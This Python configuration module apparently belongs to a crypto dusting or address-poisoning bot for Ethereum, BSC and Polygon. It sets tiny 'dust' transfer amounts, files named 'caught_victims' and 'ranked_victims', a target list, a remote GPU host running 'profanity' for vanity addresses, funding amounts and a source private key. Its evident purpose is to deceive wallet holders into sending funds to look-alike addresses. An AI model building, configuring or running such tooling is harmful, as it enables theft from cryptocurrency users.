import os
import os.path
from dotenv import load_dotenv

# PM2 Safety: Ensure .env does NOT overwrite OS-level variables injected by PM2
load_dotenv(override=False)

# --- NEW: Dynamic Unit Parsing Helper ---
def parse_units(amount_str, decimals):
    """Converts a human-readable float string into atomic integer units."""
    return int(float(amount_str) * (10 ** decimals))

# Read human-readable dust values from .env, with safe fallbacks
env_dust_native = os.getenv("DUST_NATIVE", "0.0001")
env_dust_usdc = os.getenv("DUST_USDC", "0.0242")
env_dust_usdt = os.getenv("DUST_USDT", "0.0242")

# --- Chain definitions with token decimals ---
CHAINS = {
    "ethereum": {
        "chain_id": 1,
        "native_symbol": "ETH",
        "rpc": os.getenv("ETH_RPC_URL") or os.getenv("NODE_RPC_URL"),
        "tokens": {
            "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
            "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        },
        "dust": {
            "ETH": parse_units(env_dust_native, 18),
            "USDC": parse_units(env_dust_usdc, 6),
            "USDT": parse_units(env_dust_usdt, 6),
        },
        "token_decimals": {
            "USDC": 6,
            "USDT": 6,
            "WETH": 18,
            "DAI": 18,
            "WBTC": 8,
        },
    },
    "bsc": {
        "chain_id": 56,
        "native_symbol": "BNB",
        "rpc": os.getenv("BSC_RPC_URL") or "https://bsc-dataseed.binance.org/",
        "tokens": {
            "USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            "USDT": "0x55d398326f99059fF775485246999027B3197955",
            "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "DAI": "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
            "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
        },
        "dust": {
            "BNB": parse_units(env_dust_native, 18),
            "USDC": parse_units(env_dust_usdc, 18), # BSC uses 18 decimals safely
            "USDT": parse_units(env_dust_usdt, 18),
        },
        "token_decimals": {
            "USDC": 18,
            "USDT": 18,
            "WBNB": 18,
            "DAI": 18,
            "BUSD": 18,
        },
    },
    "polygon": {
        "chain_id": 137,
        "native_symbol": "MATIC",
        "rpc": os.getenv("POLYGON_RPC_URL") or "https://polygon-rpc.com/",
        "tokens": {
            "USDC": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
            "USDC_NATIVE": "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
            "USDT": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
            "WMATIC": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
            "DAI": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
            "WBTC": "0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6",
        },
        "dust": {
            "MATIC": parse_units(env_dust_native, 18),
            "USDC": parse_units(env_dust_usdc, 6),
            "USDT": parse_units(env_dust_usdt, 6),
        },
        "token_decimals": {
            "USDC": 6,
            "USDC_NATIVE": 6,
            "USDT": 6,
            "WMATIC": 18,
            "DAI": 18,
            "WBTC": 8,
        },
    },
}

CHAIN = os.getenv("CHAIN", "ethereum")
SUFFIX = f"_{CHAIN}"   # all chains get suffix for consistency

# Helper to safely inject chain suffix into ANY filename from .env
def append_chain_suffix(file_path):
    if not file_path:
        return file_path
    base, ext = os.path.splitext(file_path)
    return f"{base}{SUFFIX}{ext}"

class Config:
    def __init__(self):
        # --- Active chain ---
        self.CHAIN = CHAIN

        # --- RPC URLs (legacy) ---
        self.DUSTER_RPC_URL = os.getenv("DUSTER_RPC_URL")
        self.FALLBACK_RPC_URLS = os.getenv("FALLBACK_RPC_URLS", "").split(",") if os.getenv("FALLBACK_RPC_URLS") else []

        # --- Files (chain‑aware and perfectly isolated) ---
        self.VAULT_FILE = append_chain_suffix(os.getenv("VAULT_FILE", "vault.txt"))
        self.QUALIFIED_FILE = append_chain_suffix(os.getenv("QUALIFIED_FILE", "qualified_targets.txt"))
        self.PENDING_FILE = append_chain_suffix(os.getenv("PENDING_FILE", "pending_targets.txt"))
        self.PROGRESS_FILE = append_chain_suffix(os.getenv("PROGRESS_FILE", "batch_progress.txt"))
        self.CAUGHT_FILE = append_chain_suffix(os.getenv("CAUGHT_FILE", "caught_victims.txt"))
        self.RANKED_ADDRESSES_FILE = append_chain_suffix(os.getenv("RANKED_ADDRESSES_FILE", "ranked_addresses.txt"))
        self.RANKED_DETAILS_FILE = append_chain_suffix(os.getenv("RANKED_DETAILS_FILE", "ranked_victims.txt"))

        # --- Dust amounts (legacy fallback) ---
        self.DUST_AMOUNT = {
            "ETH": parse_units(env_dust_native, 18),
            "USDC": parse_units(env_dust_usdc, 6),
            "USDT": parse_units(env_dust_usdt, 6),
        }

        # --- Token configs (legacy) ---
        self.TOKEN_CONFIG = {
            "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        }

        # --- Gas ---
        self.GAS_MAX_FEE_CAP_GWEI = int(os.getenv("GAS_MAX_FEE_CAP_GWEI", "200"))
        self.GAS_PRIORITY_FEE_GWEI = int(os.getenv("GAS_PRIORITY_FEE_GWEI", "2"))
        self.GAS_FEE_BUFFER = float(os.getenv("GAS_FEE_BUFFER", "1.25"))

        # --- Logging ---
        self.LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
        self.LOG_DIR = os.getenv("LOG_DIR", "./logs")

        # --- Telegram ---
        self.TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
        self.TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

        # --- Database ---
        self.db = {
            "user": os.getenv("DB_USER"),
            "host": os.getenv("DB_HOST"),
            "database": os.getenv("DB_NAME"),
            "password": os.getenv("DB_PASSWORD"),
            "port": os.getenv("DB_PORT", "5432"),
        }

        # --- Batch generator ---
        self.BATCH_REMOTE_USER = os.getenv("BATCH_REMOTE_USER", "root")
        self.BATCH_REMOTE_HOST = os.getenv("BATCH_REMOTE_HOST", "n1.de.clorecloud.net")
        self.BATCH_REMOTE_PORT = os.getenv("BATCH_REMOTE_PORT", "1783")
        self.BATCH_REMOTE_PASSWORD = os.getenv("BATCH_REMOTE_PASSWORD")
        self.BATCH_REMOTE_PATH = os.getenv("BATCH_REMOTE_PATH", "~/profanity")

        # --- Clore API ---
        self.CLORE_API_KEY = os.getenv("CLORE_API_KEY")
        self.CLORE_INSTANCE_ID = os.getenv("CLORE_INSTANCE_ID")

        # --- Funding ---
        self.FUNDING_AMOUNT_ETH = float(os.getenv("FUNDING_AMOUNT_ETH", "0.0005"))
        self.FUNDING_GAS_PRICE_GWEI = int(os.getenv("FUNDING_GAS_PRICE_GWEI", "30"))

        # --- Encryption ---
        class Encryption:
            def __init__(self):
                self.password = os.getenv("VAULT_ENCRYPTION_PASSWORD")
        self.encryption = Encryption()

    # --- Helper methods ---
    def get_chain_config(self):
        chain = CHAINS.get(self.CHAIN)
        if not chain:
            raise ValueError(f"Unknown chain: {self.CHAIN}")
        return chain

    def get_chain_rpc(self):
        chain = self.get_chain_config()
        return chain.get("rpc") or self.DUSTER_RPC_URL

    def get_chain_tokens(self):
        chain = self.get_chain_config()
        return chain.get("tokens") or self.TOKEN_CONFIG

    def get_chain_dust(self):
        chain = self.get_chain_config()
        return chain.get("dust") or self.DUST_AMOUNT

    def get_chain_id(self):
        return self.get_chain_config()["chain_id"]

    def get_native_symbol(self):
        return self.get_chain_config()["native_symbol"]

    # --- Chain‑specific token decimals ---
    def get_token_decimals(self):
        chain = self.get_chain_config()
        return chain.get("token_decimals", {})

    # --- Chain‑specific source private key ---
    @property
    def FUNDING_SOURCE_PRIVATE_KEY(self):
        chain_key = f"SOURCE_PRIVATE_KEY_{self.CHAIN.upper()}"
        key = os.getenv(chain_key)
        if key:
            return key
        return os.getenv("SOURCE_PRIVATE_KEY")

config = Config()